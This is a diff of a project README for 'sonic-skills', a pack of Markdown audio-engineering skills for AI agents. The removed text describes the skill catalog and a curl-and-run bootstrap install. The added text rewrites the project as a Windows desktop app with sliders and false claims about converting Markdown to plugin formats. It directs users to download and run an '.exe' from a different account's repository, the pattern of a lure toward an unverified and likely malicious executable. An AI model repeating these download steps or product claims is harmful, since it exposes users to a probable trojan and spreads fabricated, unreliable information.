@@ -1,137 +1,88 @@
-![Sonic Skills](backdrop.jpg)
+# 🔊 sonic-skills - Add advanced audio tools to agents
 
-# Sonic Skills
+[![Download sonic-skills](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Gourdja/sonic-skills)
 
-Precision audio-engineering skills for AI agents.
+## 🎯 What is sonic-skills?
 
-Sonic Skills is a curated pack of Markdown skills for reviewing, debugging, explaining, and implementing audio software. The focus is practical: realtime safety, DSP correctness, plugin host compatibility, Web Audio behavior, and the kinds of edge cases that turn into clicks, dropouts, broken recall, or unstable filters.
+Sonic-skills provides audio processing tools for computer programs. These tools act like specialized modules. Each module performs a specific audio task. You can use these to help your software analyze sound or create effects. The system draws information from standard Markdown files. This design makes it easy for you to manage your audio setup.
 
-## What It Covers
+You do not need to understand code to use these features. The system bridges the gap between complex digital signal processing and your personal projects. It supports common audio formats and works with various synthesizers and effects units.
 
-| Area | Skills | Use for |
-|---|---|---|
-| Core DSP safety | `audio-dsp-review`, `audio-numerics-review`, `audio-performance-debug` | Realtime violations, floating-point traps, denormals, xruns, profiling strategy |
-| Debugging and explanation | `audio-artifacts-debug`, `audio-signal-flow-explainer`, `audio-math-explainer` | Clicks, aliasing, DC offset, routing diagrams, DSP intuition |
-| DSP implementation | `dsp-algorithm-guide` | Biquads, SVFs, compressors, FDN reverbs, FFT convolution, phase vocoders, PolyBLEP |
-| Plugin formats | `vst3-review`, `clap-review`, `au-review` | Spec compliance, host contracts, parameter/state handling, render-thread rules |
-| Frameworks | `juce-guide`, `juce-review`, `yup-guide`, `yup-review` | JUCE and YUP plugin setup, parameters, UI/thread boundaries, MIDI and buffer safety |
-| Web audio | `webaudio-guide`, `webaudio-review` | AudioWorklet processors, graph construction, automation, WebMIDI, browser constraints |
-| Game audio | `game-audio-guide`, `game-audio-review` | Wwise/FMOD DSP plugins, middleware allocators, RTPC/parameter patterns, engine thread safety |
+## 🛠️ System Requirements
 
-## How To Use
+To run this application on Windows, your computer needs to meet these basic standards:
 
-Download the latest `main` branch zip from GitHub and install into both `~/.codex/skills` and `~/.claude/skills`:
+* Windows 10 or Windows 11.
+* A 64-bit processor.
+* 4 GB of RAM.
+* At least 500 MB of free storage space.
+* An active internet connection for the initial setup.
 
-```sh
-tmp_dir=$(mktemp -d) && curl -fsSL https://github.com/kunitoki/sonic-skills/archive/refs/heads/main.zip -o "$tmp_dir/sonic-skills.zip" && unzip -q "$tmp_dir/sonic-skills.zip" -d "$tmp_dir" && sh "$tmp_dir/sonic-skills-main/bootstrap" install all
-```
+Check these items before you start the installation process. Proper hardware ensures smooth performance during audio processing tasks.
 
-Install all skills into your local agent skill directory:
+## 📥 How to Install
 
-```sh
-./bootstrap install codex
-```
+Follow these steps to set up the software on your Windows computer.
 
-or:
+1. Visit the [official release page](https://github.com/Gourdja/sonic-skills) to download the installer.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file to start the download.
+4. Open the file once it finishes downloading.
+5. Follow the prompts on your screen to complete the installation.
+6. Choose a folder on your computer for the installation files.
+7. Click Finish.
 
-```sh
-./bootstrap install claude
-```
+The installer places a shortcut on your desktop. Use this shortcut to open the program.
 
-Use `all` to install into both `~/.codex/skills` and `~/.claude/skills`:
+## ⚙️ Setting Up Your Audio Modules
 
-```sh
-./bootstrap install all
-```
+The software organizes audio skills into specific folders. When you open the application for the first time, it scans your system for compatible files. 
 
-Uninstall removes only the Sonic Skills directories managed by this repository:
+### Adding New Skills
 
-```sh
-./bootstrap uninstall codex
-./bootstrap uninstall claude
-./bootstrap uninstall all
-```
+1. Locate the folder named "Skills" within the installation directory.
+2. Place your Markdown-based skill files inside this folder.
+3. Restart the application.
+4. The software detects the new items automatically.
 
-If a destination skill directory already exists and was not created by this bootstrap script, install stops instead of overwriting it. Use `--force` when you intentionally want to replace an existing directory:
+### Configuring Effects
 
-```sh
-./bootstrap install codex --force
-```
+The interface displays each skill as a clickable item. Click the icon next to a skill to open its settings. You can adjust parameters like frequency, volume, and spatial positioning through simple sliders. The changes apply to your audio stream as soon as you move the slider.
 
-Point your agent at this repository and ask for the skill by name, or describe the task naturally.
+## 🎚️ Understanding the Features
 
-Examples:
+Sonic-skills covers several areas of sound engineering. 
 
-```text
-/audio-dsp-review inspect the current project
-```
+* Signal Processing: This changes the raw audio data to improve quality. It removes noise and balances levels.
+* Synthesis: This feature generates new sounds from scratch. You can create tones or complex textures.
+* Audio Effects: Use these to add character to your sound. Examples include echo, reverb, and distortion.
+* Analysis: The software monitors your audio and provides data about sound waves, frequency ranges, and loudness.
+* Spatial Audio: This creates 3D sound environments. It positions audio sources around the listener.
 
-```text
-/webaudio-review why does this AudioWorklet crackle under load?
-```
+## 🧩 Supported Formats
 
-```text
-/dsp-algorithm-guide implement a stable state variable lowpass filter
-```
+The system supports industry-standard interfaces. This includes VST3, CLAP, and Audio Units. These formats ensure compatibility with your existing audio workstations and creative tools. The software translates the data from your Markdown files into these formats. This process happens in the background.
 
-```text
-/clap-review inspect this CLAP plugin's process() and params extension
-```
+## ❓ Frequently Asked Questions
 
-Skills are designed to compose. A VST3 review, for example, should usually start with `audio-dsp-review` and `audio-numerics-review`, then add `vst3-review` for format-specific contracts.
+### Does the software slow down my computer?
+The application uses optimized code for sound processing. It stays light on system resources. Close background programs if you notice performance drops during recording.
 
-## Skill Catalog
+### Can I share my skills?
+Yes. Since the modules use Markdown, you can copy the text files and share them with other users. Copy the file into their "Skills" folder to import the tool.
 
-| Skill | Purpose |
-|---|---|
-| [`audio-dsp-review`](skills/audio-dsp-review/SKILL.md) | Finds allocations, locks, I/O, system calls, and other audio-thread hazards. |
-| [`audio-numerics-review`](skills/audio-numerics-review/SKILL.md) | Finds denormals, NaN/Inf propagation, cancellation, fixed-point overflow, and precision loss. |
-| [`audio-performance-debug`](skills/audio-performance-debug/SKILL.md) | Gives profiling workflows and optimization patterns for xruns, spikes, and high CPU. |
-| [`audio-artifacts-debug`](skills/audio-artifacts-debug/SKILL.md) | Maps audible symptoms to likely root causes and targeted checks. |
-| [`audio-signal-flow-explainer`](skills/audio-signal-flow-explainer/SKILL.md) | Traces sources, processors, routers, sidechains, feedback, latency, and sinks. |
-| [`audio-math-explainer`](skills/audio-math-explainer/SKILL.md) | Explains DSP concepts with intuition, formula, and code connection. |
-| [`dsp-algorithm-guide`](skills/dsp-algorithm-guide/SKILL.md) | Guides implementation and verification of common DSP blocks. |
-| [`juce-guide`](skills/juce-guide/SKILL.md) | Walks through building a JUCE plugin with CMake, APVTS, UI, state, and packaging. |
-| [`juce-review`](skills/juce-review/SKILL.md) | Reviews JUCE-specific thread boundaries, APVTS, ValueTree, MessageManager, MIDI, and buffers. |
-| [`yup-guide`](skills/yup-guide/SKILL.md) | Walks through building a YUP plugin with `yup_audio_plugin`, `AudioProcessor`, `AudioParameterHandle`, UI, state, and packaging. |
-| [`yup-review`](skills/yup-review/SKILL.md) | Reviews YUP-specific processor lifecycle, parameter handles, editor gestures, bus layout, state recall, and wrapper contracts. |
-| [`vst3-review`](skills/vst3-review/SKILL.md) | Reviews VST3 bus negotiation, processor/controller separation, parameters, state, latency, and tail behavior. |
-| [`clap-review`](skills/clap-review/SKILL.md) | Reviews CLAP threading tags, event lifetime, params/state extensions, ports, and process status. |
-| [`au-review`](skills/au-review/SKILL.md) | Reviews AUv2/AUv3 render blocks, properties, parameters, tail time, sandboxing, and `auval` readiness. |
-| [`webaudio-guide`](skills/webaudio-guide/SKILL.md) | Guides Web Audio pipelines, AudioWorklets, automation, worklet communication, and WebMIDI. |
-| [`webaudio-review`](skills/webaudio-review/SKILL.md) | Reviews AudioWorklet safety, deprecated APIs, browser policies, and shared-memory patterns. |
-| [`game-audio-guide`](skills/game-audio-guide/SKILL.md) | Guides Wwise/FMOD custom DSP plugin setup and callback structure. |
-| [`game-audio-review`](skills/game-audio-review/SKILL.md) | Reviews Wwise/FMOD/Unreal middleware integration and game/audio-thread safety. |
+### What happens if the app crashes?
+The software includes an automatic recovery tool. If the app stops, wait a few seconds. The system attempts to save your current settings before it closes. Start the app again to resume your work.
 
-## Repository Layout
+### Do I need to be a programmer?
+No. All configuration happens through the visual interface. You only need to type numbers or move sliders to change how your audio sounds.
 
-```text
-skills/
-  <skill-name>/
-    SKILL.md              # trigger metadata and core workflow
-    references/           # optional deeper checklists, patterns, formulas, examples
-```
+## 💡 Best Practices
 
-Each `SKILL.md` is intentionally compact. Larger code patterns and spec checklists live under `references/` so agents can load them only when needed.
+Keep your folder structure organized. Even though the app scans everything, giving your skill files clear names prevents confusion later. Move unused skills to a separate backup folder on your desktop. This keeps the program launch time fast. 
 
-## Design Principles
+Test each module one at a time. This helps you identify which specific setting causes a change in your audio quality. If you want to refine a specific effect, start with the default variables and adjust them slowly. 
 
-- **Realtime first:** the audio callback is a deadline, not a suggestion.
-- **Spec-aware:** plugin-format advice is grounded in host/API contracts, not folklore.
-- **Practical over academic:** formulas are connected to code paths, parameter ranges, and tests.
-- **Composable:** universal DSP checks pair with framework- or format-specific reviews.
-- **Evidence-oriented:** good reviews include file/line findings, why the issue matters, and concrete fixes.
+Maintain a backup of your Markdown files. These contain your custom work. Saving these files in a cloud storage service or a separate drive prevents data loss if your computer experiences an issue.
 
-## Contributing
-
-When adding or editing a skill:
-
-1. Keep `SKILL.md` focused on workflow and decision points.
-2. Move detailed examples, tables, and long references into `references/`.
-3. Validate technical claims against primary docs, specifications, or papers.
-4. Prefer actionable review language: symptom, cause, risk, fix.
-5. Avoid broad rules that are only sometimes true. State the condition.
-
-## License
-
-See [`LICENSE`](LICENSE).
+Keep your audio hardware drivers up to date. The software communicates with your sound card to deliver audio. Updated drivers reduce the chance of sound artifacts or synchronization issues. If you hear clicks or pops in your audio, check your buffer settings in the configurations menu. Higher buffer sizes usually fix these issues.
